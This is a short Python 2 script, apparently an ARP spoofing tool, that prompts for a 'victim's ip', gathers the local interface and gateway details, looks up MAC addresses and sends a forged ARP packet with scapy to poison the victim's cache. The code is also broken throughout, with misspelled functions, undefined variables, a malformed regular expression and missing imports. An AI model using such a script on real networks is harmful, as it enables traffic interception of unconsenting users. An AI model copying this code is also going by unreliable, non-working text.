import netinfo
import commands
from ifparser import Ifcfg
import subprocess, shlex, re
from scapy.all import *

def mac_parser(host):
	os.popoen('ping 1 %s' % host)
	fileds = os.popen('grep %s /proc/net/arp' % host).read().split()


	if len(fields) == 6 and fields[3] != "00:00:00:00:00:00":
		return fields[3]
	else:
		print ' ***** use sudo plz *****' ,host

vic_ip = raw_input("plz write victim's ip :")
data = Ifcfg(commands.getoutput('ifconfig -a'))

data.interfaces

enp0s3 = data.get_interface('enp0s3')

enp0s3.BROADCAST

add_mac = enp0s3.hwaddr
add_ip = netinfo.get_ip('enp0s3')
strs = subprocess.check_output(shlex.split('ip r l'))
string_match = r'(\d{1,3}\.\d{1.3}\.\d{1.3}\.\d{1.3})'
gateway = re.search('default via ' + string_match, strs)



print "add_ip     : "+add_ip
print "add_mac    : "+add_mac
print "geteway    : "+gateway

if os.geteuid() !=0 :
	sys.exit(" ********** use sudo plz **********")


mac_victim = mac_parser(ip_victim)
print "MAC_victim     : "+MAC_victim



mac_gateway = parser_MAC(gateway)
print "MAC_gateway    : "+MAC_gateway



send(ARP(op=ARP.who_has, pdst=ip_add, psrc=victim_ip, hwdst=mac_add))
